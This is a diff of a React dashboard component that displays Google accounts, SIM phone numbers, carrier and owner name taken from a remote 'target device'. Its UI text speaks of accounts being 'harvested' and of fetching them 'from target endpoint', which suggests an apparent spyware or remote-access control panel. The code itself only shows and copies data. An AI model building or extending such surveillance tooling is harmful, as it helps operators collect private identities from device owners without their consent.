@@ -1,10 +1,9 @@
 "use client";
 
-import React, { useState } from 'react';
+import React, { useState, useMemo } from 'react';
 import { 
     Mail, Phone, User, Copy, Check, RefreshCw, Smartphone, 
-    ShieldCheck, Hash, AtSign, Radio, AlertCircle, Info, ExternalLink,
-    CheckCircle2
+    ShieldCheck, Hash, AtSign, Radio, Search
 } from 'lucide-react';
 
 interface AccountsViewProps {
@@ -14,24 +13,25 @@ interface AccountsViewProps {
 }
 
 export default function AccountsView({ device, onRefresh, isLoading }: AccountsViewProps) {
-    const [localRefreshing, setLocalRefreshing] = useState(false);
+    const [searchQuery, setSearchQuery] = useState('');
     const [copiedKey, setCopiedKey] = useState<string | null>(null);
+    const [localLoading, setLocalLoading] = useState(false);
 
-    const isBusy = isLoading || localRefreshing;
+    const isFetching = isLoading || localLoading;
     const isOnline = Boolean(device?.online);
+
+    const handleRefresh = () => {
+        if (!isOnline || isFetching) return;
+        setLocalLoading(true);
+        onRefresh();
+        setTimeout(() => setLocalLoading(false), 2000);
+    };
 
     const handleCopy = (text: string, key: string) => {
         if (!text) return;
         navigator.clipboard.writeText(text);
         setCopiedKey(key);
-        setTimeout(() => setCopiedKey(null), 2000);
-    };
-
-    const handleRefresh = () => {
-        if (!isOnline || isBusy) return;
-        setLocalRefreshing(true);
-        onRefresh();
-        setTimeout(() => setLocalRefreshing(false), 2000);
+        setTimeout(() => setCopiedKey(null), 1800);
     };
 
     const gmails: string[] = device?.gmails && Array.isArray(device.gmails) && device.gmails.length > 0
@@ -45,275 +45,179 @@ export default function AccountsView({ device, onRefresh, isLoading }: AccountsV
     const carrier = device?.carrier || '';
     const ownerName = device?.ownerName || device?.name || 'Device Owner';
 
+    const accountItems = useMemo(() => {
+        const list: { id: string; type: 'email' | 'phone'; title: string; subtitle: string; icon: any }[] = [];
+        gmails.forEach((g, idx) => {
+            list.push({
+                id: `email_${idx}`,
+                type: 'email',
+                title: g,
+                subtitle: idx === 0 ? 'Primary Google Account' : 'Google Sync Account',
+                icon: AtSign
+            });
+        });
+        phoneNumbers.forEach((p, idx) => {
+            list.push({
+                id: `phone_${idx}`,
+                type: 'phone',
+                title: p,
+                subtitle: carrier ? `SIM Line • ${carrier}` : 'Verified Mobile Identity',
+                icon: Phone
+            });
+        });
+        return list;
+    }, [gmails, phoneNumbers, carrier]);
+
+    const filteredAccounts = useMemo(() => {
+        if (!searchQuery.trim()) return accountItems;
+        const q = searchQuery.toLowerCase();
+        return accountItems.filter(item => 
+            item.title.toLowerCase().includes(q) || 
+            item.subtitle.toLowerCase().includes(q)
+        );
+    }, [accountItems, searchQuery]);
+
     return (
-        <div className="w-full max-w-7xl mx-auto px-3 sm:px-6 py-4 space-y-6 pb-20">
-            <header className="rounded-2xl border border-white/[0.07] bg-[#0c121e]/90 p-4 sm:p-6 backdrop-blur-md">
-                <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
-                    <div className="flex items-center gap-3.5 min-w-0">
-                        <div className="w-12 h-12 rounded-xl bg-rose-500/10 border border-rose-500/20 flex items-center justify-center text-rose-400 shrink-0">
-                            <Mail className="w-6 h-6" />
-                        </div>
-                        <div className="min-w-0">
-                            <div className="flex items-center gap-2.5 flex-wrap">
-                                <h1 className="text-lg sm:text-xl font-bold tracking-tight text-white truncate">
-                                    Identity & Account Intelligence
-                                </h1>
-                                <span className={`inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-xs font-medium tracking-wide border ${
-                                    isOnline 
-                                        ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30' 
-                                        : 'bg-rose-500/10 text-rose-400 border-rose-500/20'
-                                }`}>
-                                    <span className={`w-1.5 h-1.5 rounded-full ${isOnline ? 'bg-emerald-400 animate-pulse' : 'bg-rose-400'}`} />
-                                    {isOnline ? 'ONLINE' : 'OFFLINE'}
-                                </span>
-                            </div>
-                            <p className="text-xs text-white/50 truncate mt-0.5">
-                                {device?.name || 'Target Device'} • Authenticated Google Accounts, SIM Lines & Owner Profile
-                            </p>
-                        </div>
-                    </div>
-
-                    <div className="flex items-center gap-2.5 shrink-0 self-start md:self-auto">
-                        <button
-                            onClick={handleRefresh}
-                            disabled={!isOnline || isBusy}
-                            className={`flex items-center gap-2 px-4 py-2.5 rounded-xl font-semibold text-xs tracking-wide transition-all border ${
-                                !isOnline 
-                                    ? 'bg-white/[0.02] border-white/5 text-white/30 cursor-not-allowed'
-                                    : 'bg-rose-500/15 border-rose-500/30 text-rose-300 hover:bg-rose-500/25 active:scale-[0.98]'
-                            }`}
-                        >
-                            <RefreshCw className={`w-3.5 h-3.5 ${isBusy ? 'animate-spin' : ''}`} />
-                            <span>{isBusy ? 'Synchronizing...' : 'Refresh Accounts'}</span>
-                        </button>
-                    </div>
+        <div className="max-w-6xl mx-auto space-y-4 sm:space-y-5 animate-in fade-in zoom-in-95 duration-400 pb-16">
+            <div className="flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-3">
+                <div className="relative flex-1 max-w-md">
+                    <Search size={14} className="absolute left-3.5 top-1/2 -translate-y-1/2 text-orange-400/70" />
+                    <input 
+                        type="text" 
+                        placeholder="Search accounts & phone numbers..." 
+                        value={searchQuery}
+                        onChange={(e) => setSearchQuery(e.target.value)}
+                        className="clay-capsule w-full pl-9 pr-24 py-2.5 rounded-2xl text-xs font-mono font-bold text-white placeholder:text-white/30 focus:outline-none focus:border-orange-500/60 transition-all shadow-inner"
+                    />
+                    <span className="absolute right-2.5 top-1/2 -translate-y-1/2 px-2 py-0.5 rounded-lg bg-orange-500/15 border border-orange-500/20 text-[10px] font-mono font-bold text-orange-300">
+                        {filteredAccounts.length}
+                    </span>
                 </div>
 
-                {!isOnline && (
-                    <div className="mt-4 p-3 rounded-xl bg-rose-500/10 border border-rose-500/20 flex items-center gap-3 text-xs text-rose-300">
-                        <AlertCircle className="w-4 h-4 shrink-0 text-rose-400" />
-                        <span>Target device is currently offline. Showing cached account identities from last connection.</span>
-                    </div>
-                )}
-            </header>
-
-            <section className="grid grid-cols-2 lg:grid-cols-4 gap-3 sm:gap-4">
-                <div className="p-4 rounded-xl border border-white/[0.06] bg-[#0c121e]/60 space-y-1.5">
-                    <div className="flex items-center justify-between text-white/40 text-xs">
-                        <span>Google Accounts</span>
-                        <AtSign className="w-4 h-4 text-rose-400" />
-                    </div>
-                    <div className="flex items-baseline gap-1.5">
-                        <span className="font-mono text-xl sm:text-2xl font-bold text-white tabular-nums">
-                            {gmails.length}
-                        </span>
-                        <span className="text-xs text-white/40">Synced</span>
-                    </div>
-                    <p className="text-[11px] text-white/40 truncate">
-                        {gmails[0] || 'No accounts yet'}
-                    </p>
-                </div>
-
-                <div className="p-4 rounded-xl border border-white/[0.06] bg-[#0c121e]/60 space-y-1.5">
-                    <div className="flex items-center justify-between text-white/40 text-xs">
-                        <span>SIM & Phone Lines</span>
-                        <Phone className="w-4 h-4 text-emerald-400" />
-                    </div>
-                    <div className="flex items-baseline gap-1.5">
-                        <span className="font-mono text-xl sm:text-2xl font-bold text-white tabular-nums">
-                            {phoneNumbers.length}
-                        </span>
-                        <span className="text-xs text-white/40">Detected</span>
-                    </div>
-                    <p className="text-[11px] text-white/40 truncate">
-                        {phoneNumbers[0] || (carrier ? `Carrier: ${carrier}` : 'Awaiting sync')}
-                    </p>
-                </div>
-
-                <div className="p-4 rounded-xl border border-white/[0.06] bg-[#0c121e]/60 space-y-1.5">
-                    <div className="flex items-center justify-between text-white/40 text-xs">
-                        <span>Network Provider</span>
-                        <Radio className="w-4 h-4 text-cyan-400" />
-                    </div>
-                    <div className="flex items-baseline gap-1.5">
-                        <span className="text-base sm:text-lg font-bold text-white truncate">
-                            {carrier || (isOnline ? 'Active Network' : 'Disconnected')}
-                        </span>
-                    </div>
-                    <p className="text-[11px] text-white/40 truncate">
-                        {carrier ? 'SIM Telemetry' : 'Carrier network'}
-                    </p>
-                </div>
-
-                <div className="p-4 rounded-xl border border-white/[0.06] bg-[#0c121e]/60 space-y-1.5">
-                    <div className="flex items-center justify-between text-white/40 text-xs">
-                        <span>Device Owner</span>
-                        <User className="w-4 h-4 text-indigo-400" />
-                    </div>
-                    <div className="flex items-baseline gap-1.5">
-                        <span className="text-base sm:text-lg font-bold text-white truncate">
-                            {ownerName}
-                        </span>
-                    </div>
-                    <p className="text-[11px] text-white/40 truncate">
-                        Verified Device Identity
-                    </p>
-                </div>
-            </section>
-
-            <div className="grid grid-cols-1 lg:grid-cols-2 gap-5">
-                <section className="p-5 sm:p-6 rounded-2xl border border-white/[0.06] bg-[#0c121e]/60 space-y-4">
-                    <div className="flex items-center justify-between pb-3 border-b border-white/[0.05]">
-                        <div className="flex items-center gap-2 text-rose-400">
-                            <AtSign className="w-4 h-4" />
-                            <h2 className="text-xs font-bold tracking-wider uppercase text-white">Google Accounts (Gmail)</h2>
-                        </div>
-                        <span className="px-2 py-0.5 rounded-full text-[11px] font-mono bg-rose-500/10 text-rose-400 border border-rose-500/20">
-                            {gmails.length} Recorded
+                <div className="flex items-center gap-2 self-end sm:self-center">
+                    <div className={`clay-pill px-3 py-1.5 flex items-center gap-1.5 ${
+                        isOnline 
+                            ? 'clay-pill-emerald text-emerald-200' 
+                            : 'bg-white/[0.04] border border-white/5 text-white/40'
+                    }`}>
+                        <span className={`w-1.5 h-1.5 rounded-full ${
+                            isOnline ? 'bg-emerald-400 animate-pulse' : 'bg-white/20'
+                        }`} />
+                        <span className="text-[10px] font-mono font-black uppercase tracking-wider">
+                            {isOnline ? 'ONLINE' : 'OFFLINE'}
                         </span>
                     </div>
 
-                    <div className="space-y-2.5">
-                        {gmails.length > 0 ? (
-                            gmails.map((email: string, idx: number) => (
-                                <div 
-                                    key={idx} 
-                                    className="flex items-center justify-between p-3.5 rounded-xl border border-white/[0.04] bg-white/[0.02] hover:bg-white/[0.04] transition-colors"
-                                >
-                                    <div className="flex items-center gap-3 min-w-0 mr-2">
-                                        <div className="w-9 h-9 rounded-lg bg-rose-500/15 border border-rose-500/20 flex items-center justify-center text-rose-400 font-bold text-xs shrink-0">
-                                            {email[0]?.toUpperCase() || 'G'}
-                                        </div>
-                                        <div className="min-w-0">
-                                            <p className="font-mono text-xs sm:text-sm font-semibold text-white truncate">
-                                                {email}
-                                            </p>
-                                            <p className="text-[10px] text-white/40 mt-0.5">
-                                                {idx === 0 ? 'Primary Google Account' : 'Secondary Sync Account'}
-                                            </p>
-                                        </div>
-                                    </div>
-
-                                    <button
-                                        onClick={() => handleCopy(email, `email_${idx}`)}
-                                        className="p-2 sm:px-3 sm:py-1.5 rounded-lg border border-white/[0.06] bg-white/[0.03] hover:bg-white/[0.08] text-white/70 hover:text-white transition-all shrink-0 flex items-center gap-1.5 text-xs active:scale-95"
-                                        title="Copy Email"
-                                    >
-                                        {copiedKey === `email_${idx}` ? (
-                                            <>
-                                                <Check className="w-3.5 h-3.5 text-emerald-400" />
-                                                <span className="hidden sm:inline text-emerald-400 text-[11px] font-medium">Copied</span>
-                                            </>
-                                        ) : (
-                                            <>
-                                                <Copy className="w-3.5 h-3.5" />
-                                                <span className="hidden sm:inline text-[11px]">Copy</span>
-                                            </>
-                                        )}
-                                    </button>
-                                </div>
-                            ))
-                        ) : (
-                            <div className="py-10 px-4 rounded-xl border border-white/[0.03] bg-white/[0.01] text-center space-y-2">
-                                <Mail className="w-8 h-8 text-white/20 mx-auto" />
-                                <h3 className="text-xs font-semibold text-white/80">No Google Accounts Synchronized</h3>
-                                <p className="text-[11px] text-white/40 max-w-sm mx-auto">
-                                    Accounts are harvested via contacts sync provider. Ensure target has active Google account signed in and contacts permission is authorized.
-                                </p>
-                            </div>
-                        )}
-                    </div>
-                </section>
-
-                <section className="p-5 sm:p-6 rounded-2xl border border-white/[0.06] bg-[#0c121e]/60 space-y-4">
-                    <div className="flex items-center justify-between pb-3 border-b border-white/[0.05]">
-                        <div className="flex items-center gap-2 text-emerald-400">
-                            <Phone className="w-4 h-4" />
-                            <h2 className="text-xs font-bold tracking-wider uppercase text-white">SIM & Mobile Numbers</h2>
-                        </div>
-                        <div className="flex items-center gap-2">
-                            {carrier && (
-                                <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-mono bg-emerald-500/10 text-emerald-300 border border-emerald-500/20">
-                                    <Radio className="w-2.5 h-2.5 text-emerald-400" /> {carrier}
-                                </span>
-                            )}
-                            <span className="px-2 py-0.5 rounded-full text-[11px] font-mono bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
-                                {phoneNumbers.length} Detected
-                            </span>
-                        </div>
-                    </div>
-
-                    <div className="space-y-2.5">
-                        {phoneNumbers.length > 0 ? (
-                            phoneNumbers.map((num: string, idx: number) => (
-                                <div 
-                                    key={idx} 
-                                    className="flex items-center justify-between p-3.5 rounded-xl border border-white/[0.04] bg-white/[0.02] hover:bg-white/[0.04] transition-colors"
-                                >
-                                    <div className="flex items-center gap-3 min-w-0 mr-2">
-                                        <div className="w-9 h-9 rounded-lg bg-emerald-500/15 border border-emerald-500/20 flex items-center justify-center text-emerald-400 font-bold text-xs shrink-0">
-                                            #{idx + 1}
-                                        </div>
-                                        <div className="min-w-0">
-                                            <p className="font-mono text-xs sm:text-sm font-bold text-emerald-300 truncate">
-                                                {num}
-                                            </p>
-                                            <p className="text-[10px] text-white/40 mt-0.5">
-                                                {carrier ? `Mobile Line • ${carrier}` : 'Verified Mobile Identity'}
-                                            </p>
-                                        </div>
-                                    </div>
-
-                                    <button
-                                        onClick={() => handleCopy(num, `phone_${idx}`)}
-                                        className="p-2 sm:px-3 sm:py-1.5 rounded-lg border border-white/[0.06] bg-white/[0.03] hover:bg-white/[0.08] text-white/70 hover:text-white transition-all shrink-0 flex items-center gap-1.5 text-xs active:scale-95"
-                                        title="Copy Phone Number"
-                                    >
-                                        {copiedKey === `phone_${idx}` ? (
-                                            <>
-                                                <Check className="w-3.5 h-3.5 text-emerald-400" />
-                                                <span className="hidden sm:inline text-emerald-400 text-[11px] font-medium">Copied</span>
-                                            </>
-                                        ) : (
-                                            <>
-                                                <Copy className="w-3.5 h-3.5" />
-                                                <span className="hidden sm:inline text-[11px]">Copy</span>
-                                            </>
-                                        )}
-                                    </button>
-                                </div>
-                            ))
-                        ) : (
-                            <div className="py-10 px-4 rounded-xl border border-white/[0.03] bg-white/[0.01] text-center space-y-2">
-                                <Phone className="w-8 h-8 text-white/20 mx-auto" />
-                                <h3 className="text-xs font-semibold text-white/80">No SIM Phone Number Recorded</h3>
-                                <p className="text-[11px] text-white/40 max-w-sm mx-auto">
-                                    {carrier 
-                                        ? `Carrier ${carrier} active. Most SIM cards do not write the MSISDN directly to the SIM card. Active WhatsApp or messaging sync will resolve the line number.` 
-                                        : 'Awaiting SIM registration or messaging account sync.'}
-                                </p>
-                            </div>
-                        )}
-                    </div>
-                </section>
+                    <button 
+                        type="button"
+                        onClick={handleRefresh} 
+                        disabled={!isOnline || isFetching} 
+                        className={`clay-cta-button px-4 py-2.5 rounded-xl text-xs font-black uppercase tracking-wider flex items-center gap-2 transition-all cursor-pointer ${
+                            !isOnline || isFetching ? 'opacity-50 cursor-not-allowed' : 'hover:scale-105 active:scale-95'
+                        }`}
+                    >
+                        <RefreshCw size={13} className={isFetching ? "animate-spin" : ""} /> 
+                        <span>{isFetching ? 'Syncing...' : 'Sync Accounts'}</span>
+                    </button>
+                </div>
             </div>
 
-            <section className="p-5 sm:p-6 rounded-2xl border border-white/[0.06] bg-[#0c121e]/60 space-y-3">
-                <div className="flex items-center gap-2 text-indigo-400 pb-2 border-b border-white/[0.05]">
-                    <User className="w-4 h-4" />
-                    <h2 className="text-xs font-bold tracking-wider uppercase text-white">Device Owner Profile & Provenance</h2>
-                </div>
-                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 p-4 rounded-xl border border-white/[0.04] bg-white/[0.02]">
-                    <div className="space-y-0.5">
-                        <span className="text-[11px] text-white/40 uppercase tracking-wider font-semibold">Registered Host Display Name</span>
-                        <p className="text-base sm:text-lg font-bold text-white tracking-tight">{ownerName}</p>
+            <div className="grid grid-cols-2 sm:grid-cols-4 gap-2.5 sm:gap-3">
+                <div className="clay-capsule p-3 rounded-2xl flex items-center gap-3">
+                    <div className="clay-icon-pod w-9 h-9 rounded-xl flex items-center justify-center text-orange-400 shrink-0">
+                        <User size={16} />
                     </div>
-                    <div className="flex items-center gap-2 px-3 py-1.5 rounded-lg border border-emerald-500/20 bg-emerald-500/10 text-emerald-400 text-xs font-medium self-start sm:self-auto">
-                        <ShieldCheck className="w-4 h-4" />
-                        <span>Verified Account Profile</span>
+                    <div className="min-w-0">
+                        <span className="text-[10px] text-white/40 font-mono uppercase block">Owner</span>
+                        <span className="text-xs font-bold text-white font-mono truncate block">{ownerName}</span>
                     </div>
                 </div>
-            </section>
+
+                <div className="clay-capsule p-3 rounded-2xl flex items-center gap-3">
+                    <div className="clay-icon-pod w-9 h-9 rounded-xl flex items-center justify-center text-orange-400 shrink-0">
+                        <Radio size={16} />
+                    </div>
+                    <div className="min-w-0">
+                        <span className="text-[10px] text-white/40 font-mono uppercase block">Network</span>
+                        <span className="text-xs font-bold text-white font-mono truncate block">{carrier || (isOnline ? 'Connected' : 'Offline')}</span>
+                    </div>
+                </div>
+
+                <div className="clay-capsule p-3 rounded-2xl flex items-center gap-3">
+                    <div className="clay-icon-pod w-9 h-9 rounded-xl flex items-center justify-center text-orange-400 shrink-0">
+                        <AtSign size={16} />
+                    </div>
+                    <div className="min-w-0">
+                        <span className="text-[10px] text-white/40 font-mono uppercase block">Google</span>
+                        <span className="text-xs font-bold text-white font-mono truncate block">{gmails.length} Synced</span>
+                    </div>
+                </div>
+
+                <div className="clay-capsule p-3 rounded-2xl flex items-center gap-3">
+                    <div className="clay-icon-pod w-9 h-9 rounded-xl flex items-center justify-center text-orange-400 shrink-0">
+                        <Phone size={16} />
+                    </div>
+                    <div className="min-w-0">
+                        <span className="text-[10px] text-white/40 font-mono uppercase block">Mobile</span>
+                        <span className="text-xs font-bold text-white font-mono truncate block">{phoneNumbers.length} Detected</span>
+                    </div>
+                </div>
+            </div>
+
+            <div className="min-h-[400px]">
+                {filteredAccounts.length === 0 ? (
+                    <div className="clay-card py-20 flex flex-col items-center justify-center text-center gap-3 p-6 min-h-[260px]">
+                        <div className="clay-icon-pod w-16 h-16 rounded-2xl flex items-center justify-center">
+                            <Mail size={28} strokeWidth={1.5} className="text-orange-400/50" />
+                        </div>
+                        <div>
+                            <h4 className="text-sm font-bold text-white/60">No Accounts Found</h4>
+                            <p className="text-xs text-white/30 font-mono mt-0.5">Click Sync Accounts to fetch Google accounts and SIM numbers from target endpoint.</p>
+                        </div>
+                    </div>
+                ) : (
+                    <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3 sm:gap-3.5">
+                        {filteredAccounts.map((item) => {
+                            const IconComponent = item.icon;
+                            const isCopied = copiedKey === item.id;
+
+                            return (
+                                <div 
+                                    key={item.id} 
+                                    className="clay-capsule p-3.5 rounded-2xl flex items-center justify-between gap-3 transition-all hover:border-orange-500/40 hover:scale-[1.01] group"
+                                >
+                                    <div className="flex items-center gap-3 min-w-0">
+                                        <div className="clay-icon-pod w-10 h-10 rounded-xl flex items-center justify-center text-orange-400 font-mono font-black text-sm shrink-0 group-hover:scale-105 transition-transform">
+                                            {item.type === 'email' ? (
+                                                item.title.charAt(0).toUpperCase()
+                                            ) : (
+                                                <Phone size={16} />
+                                            )}
+                                        </div>
+                                        <div className="flex flex-col min-w-0">
+                                            <h4 className="font-bold text-xs sm:text-sm text-white truncate font-mono group-hover:text-orange-300 transition-colors">
+                                                {item.title}
+                                            </h4>
+                                            <span className="text-[10px] text-white/40 font-mono tracking-wide truncate mt-0.5">
+                                                {item.subtitle}
+                                            </span>
+                                        </div>
+                                    </div>
+
+                                    <button
+                                        type="button"
+                                        onClick={() => handleCopy(item.title, item.id)}
+                                        className="clay-button-sm p-2 rounded-xl text-white/60 hover:text-white shrink-0 transition-colors cursor-pointer"
+                                        title={`Copy ${item.type === 'email' ? 'Email' : 'Number'}`}
+                                    >
+                                        {isCopied ? <Check size={13} className="text-emerald-400" /> : <Copy size={13} />}
+                                    </button>
+                                </div>
+                            );
+                        })}
+                    </div>
+                )}
+            </div>
         </div>
     );
 }
